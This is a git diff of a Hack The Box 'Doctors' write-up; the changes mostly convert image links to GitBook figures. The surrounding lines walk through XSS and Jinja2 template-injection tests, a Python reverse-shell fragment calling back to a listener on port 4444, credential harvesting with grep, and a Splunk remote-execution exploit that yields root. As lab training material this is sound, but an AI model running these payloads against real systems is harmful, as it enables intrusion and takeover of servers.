@@ -121,7 +121,9 @@ Add:
 
 #### **Navigating to doctors.htb**
 
-!\[\[login.png]]
+<figure><img src="../../.gitbook/assets/login.png" alt=""><figcaption></figcaption></figure>
+
+
 
 We see a **login** screen. CSS might look broken at first, but no big deal. This hints we might be dealing with a quirky setup or partial content. Actually a quick update, I switched the VPN from EU to US in the HTB website and this made the CSS load way faster. So quick tip for everyone there.
 
@@ -141,7 +143,9 @@ We see:
 
 We’ll create an account to see the next stage:
 
-!\[\[register.png]]
+<figure><img src="../../.gitbook/assets/register.png" alt=""><figcaption></figcaption></figure>
+
+
 
 > **Side Note**: _OWASP A05:2021 – Security Misconfiguration_ also suggests we check if the site enforces strong passwords, or if there’s a **Registration** endpoint vulnerable to weird payloads. I used the password test which is 4 characters, so we know there is literally no password complexity implemented here.
 
@@ -178,13 +182,17 @@ Again, this is **extra knowledge for web app pentesters**, not a required step f
 
 After registration, we see:
 
-!\[\[home-doctors.png]]
+<figure><img src="../../.gitbook/assets/home-doctors.png" alt=""><figcaption></figcaption></figure>
+
+
 
 There’s a “New Message” feature at `/Home`. We should open **Burp Suite** to watch for cookies and session tokens (OWASP session mgmt best practices).
 
 #### **New Message**: Potential XSS, SQLi, or Template Injection
 
-!\[\[post-new.png]]
+<figure><img src="../../.gitbook/assets/post-new.png" alt=""><figcaption></figcaption></figure>
+
+
 
 Here’s where a **web app** pentester would methodically test:
 
@@ -198,13 +206,13 @@ Given my **TCM Security** training, I note the fastest tests: XSS or template in
 <h1>xss</h1><strong>xss</strong>
 ```
 
-!\[\[xss-payload.png]]
+<figure><img src="../../.gitbook/assets/xss-payload.png" alt=""><figcaption></figcaption></figure>
 
 No reflection, **the site filters** our markup. Possibly **OWASP A03:2021 – Injection** is partially mitigated. Let’s pivot to **Template Injection**.
 
 Lets check out the source code:
 
-!\[\[source-code-xss.png]]
+<figure><img src="../../.gitbook/assets/source-code-archive.png" alt=""><figcaption></figcaption></figure>
 
 We learn that it is being filtered out, so we either have to look for ways to bypass the filtering to get a food in the door for vertical movement, but lets move on to another attack for now and return to it later if we aren't successful.
 
@@ -224,18 +232,29 @@ If it triggers a 500 error, we have injection.
 
 Lets put it in the title and content sections, we don't know which one will process it so just to be on the safe side lets see what happens here:
 
-!\[\[post-polygot.png]]\
-!\[\[polyglot-reflected.png]]
+<figure><img src="../../.gitbook/assets/post-polygot.png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/polyglot-reflected.png" alt=""><figcaption></figcaption></figure>
+
+
+
+
 
 It gets reflected back but sanitized, no 500 error. Similar to the XSS payload, lets investigate the source code to see what is happening, how is it being filtered?
 
 We find a clue in the source about an **/archive** endpoint:
 
-!\[\[source-code-archive.png]]
+<figure><img src="../../.gitbook/assets/source-code-archive (1).png" alt=""><figcaption></figcaption></figure>
+
+
 
 Visiting `/archive` yields an **error page**:
 
-!\[\[archive-error.png]]
+<figure><img src="../../.gitbook/assets/archive-error.png" alt=""><figcaption></figcaption></figure>
+
+
 
 **Yes!** This suggests partial template injection that might be triggered elsewhere. Alright things are about to pick up, we can now concentrate on SSTI instead of other attacks.
 
@@ -250,7 +269,9 @@ From **PayloadsAllTheThings**, we know:
 
 We’ll also consult the handy **flowchart** below (screen shot is from payloadsallthethings):
 
-!\[\[ssti-flowchart.png]]
+<figure><img src="../../.gitbook/assets/ssti-flowchart.png" alt=""><figcaption></figcaption></figure>
+
+
 
 We remove the old post causing a 500 error, then create a new one with `{{7*7}}` in the Title (and possibly the body). Next, we head to `/archive` to see if it evaluates.
 
@@ -263,10 +284,17 @@ This flowchart (from PayloadsAllTheThings) shows common SSTI test patterns. Let 
 
 Let’s pop open **Burp Suite** and watch the **HTTP history** for `/home` and `/archive`.
 
-* **BurpSuite /home endpoint**:\
-  !\[\[burp-server-identity.png]]
-* **BurpSuite /archive endpoint**:\
-  !\[\[archive-49.png]]
+* **BurpSuite /home endpoint**:
+
+<figure><img src="../../.gitbook/assets/burp-server-identity.png" alt=""><figcaption></figcaption></figure>
+
+
+
+* **BurpSuite /archive endpoint**:
+
+<figure><img src="../../.gitbook/assets/archive-49.png" alt=""><figcaption></figcaption></figure>
+
+
 
 Two big takeaways here:
 
@@ -279,7 +307,9 @@ This is good news! Now that we have a potential **SSTI** and a strong guess it�
 
 Let’s post **another** new message using only the Title field this time (so we’re not cluttering up the page with multiple payloads). Revisit **/archive**, crack open the source, and if all goes well, you’ll see **49** (from our previous payload) and now **7777777**. That all but confirms **Jinja2**. Next stop: **RCE** territory!
 
-!\[\[archive-jinja-payload.png]]
+<figure><img src="../../.gitbook/assets/archive-jinja-payload.png" alt=""><figcaption></figcaption></figure>
+
+
 
 ***
 
@@ -387,17 +417,23 @@ s.connect(("ip",4444))
 4. `nc -lvnp 4444`
 5. Browse to `/archive` to make the server parse our post.
 
-!\[\[title-payload.png]]
+<figure><img src="../../.gitbook/assets/title-payload.png" alt=""><figcaption></figcaption></figure>
+
+
 
 We see the post was accepted. When we load `/archive`, it should attempt to run our Python one-liner. If the IP and port match your listener, you should catch a reverse shell:
 
-!\[\[jinja-payload-failed.png]]
+<figure><img src="../../.gitbook/assets/jinja-payload-failed.png" alt=""><figcaption></figcaption></figure>
+
+
 
 Even though this screenshot says "failed," if your payload is correct, it may still reach out to your listener. If you only see a quick response like the contents of `flag.txt`, that means you forgot to switch `cat flag.txt` to `/bin/bash -i`. Once you make that change and reload `/archive`, you should see:
 
-!\[\[reverse-shell-success.png]]
+<figure><img src="../../.gitbook/assets/reverse-shell-success.png" alt=""><figcaption></figcaption></figure>
 
-Running `pwd` or `id` confirms we have a shell.
+
+
+Running `pwd` or `id` confirms we have a shell! Sick.
 
 ***
 
@@ -433,7 +469,9 @@ Now that we have a shell, we look around for anything that can help us pivot. A 
 * `-R` tells grep to search recursively in subdirectories.
 * `-o` prints the matching parts only.
 
-!\[\[enum-user-creds.png]]
+<figure><img src="../../.gitbook/assets/enum-user-creds.png" alt=""><figcaption></figcaption></figure>
+
+
 
 First thing that jumps out is all the **permission denied** errors. No surprise there—we don’t have access to everything yet. But look a little closer and you’ll see something interesting.
 
@@ -457,7 +495,9 @@ su shaun
 
 If the password works, you should see this:
 
-!\[\[login-shaun.png]]
+<figure><img src="../../.gitbook/assets/login-shaun.png" alt=""><figcaption></figcaption></figure>
+
+
 
 Nice. We’re in. Since we need a **user flag**, it’s safe to assume it’s somewhere in Shaun’s home directory. Let’s start looking around.
 
@@ -474,7 +514,9 @@ I checked inside `shaun` and sure enough, **user.txt** was sitting there. Let’
 cat user.txt
 ```
 
-!\[\[userflag.png]]
+<figure><img src="../../.gitbook/assets/userflag.png" alt=""><figcaption></figcaption></figure>
+
+
 
 There it is. The **user flag** is ours. Now we can head back to HTB, submit it, and move on to the real challenge, getting root. Feels cool to say it doesn't it? On some Mr. Robot type stuff.
 
@@ -489,7 +531,9 @@ During our initial Nmap scan, we noticed Splunk running on port 8089. Splunk has
 * `ps aux` displays all running processes.
 * `grep splunk` filters the list to show only lines containing "splunk."
 
-!\[\[grep-splunk-proc.png]]
+<figure><img src="../../.gitbook/assets/grep-splunk-proc.png" alt=""><figcaption></figcaption></figure>
+
+
 
 Splunk is indeed active.
 
@@ -513,7 +557,9 @@ We attempt a simple command:
 
 `python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.38 --payload id`
 
-!\[\[pySplunkError.png]]
+<figure><img src="../../.gitbook/assets/pySplunkError (1).png" alt=""><figcaption></figcaption></figure>
+
+
 
 It fails with an authentication error. No problem, we have shaun:Guitar123. Let us try that with a reverse shell. Before running the exploit, start a listener on port 1994:
 
@@ -662,13 +708,13 @@ This payload **manually recreates a pipe (`|`)** to keep the connection open:
 
 ### Let's run our payload:
 
-!\[\[pysplunkRCE.png]]
+<figure><img src="../../.gitbook/assets/pysplunkRCE.png" alt=""><figcaption></figcaption></figure>
 
 It connects, and no authentication issues, so now lets check the shell on your netcat listener and see what we get
 
 And oh my, what a thing of beauty, we get a shell, and most importantly, we have root.
 
-!\[\[root.png]]
+<figure><img src="../../.gitbook/assets/root.png" alt=""><figcaption></figcaption></figure>
 
 We can see a root environment. Use `ls` or `pwd` to verify, then:
 
